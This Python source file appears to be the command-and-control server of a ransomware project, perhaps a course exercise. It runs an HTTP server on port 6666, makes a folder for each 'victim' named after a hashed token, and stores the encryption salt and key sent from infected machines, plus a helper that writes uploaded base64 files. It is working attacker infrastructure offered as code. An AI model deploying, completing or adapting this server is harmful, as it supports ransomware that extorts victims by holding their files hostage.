import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase
import hashlib
class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        value_token = body["token"] # get the token
        self._log.info(f"TOKEN: {value_token}")
        value_salt = body["salt"] # get the salt
        value_key = body["key"] # get the key
        decript_token = hashlib.sha256(base64.b64decode(value_token)).hexdigest() # decrypt the token
        dir_victim = os.path.join(CNC.ROOT_PATH,decript_token) # path of the folder of the victim
        os.makedirs(dir_victim,exist_ok=True) # folder of the victim


        # in the folder of the victim save the salt and the key
        with open(os.path.join(dir_victim,"salt"),"w") as salt_file:
            salt_file.write(value_salt)
        with open(os.path.join(dir_victim,"key"),"w") as key_file:
            key_file.write(value_key)

        # return dict with the status of the request
        if os.path.isdir(dir_victim):
            return {"status":"Succes"}
        else:
            return {"status":"Error"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()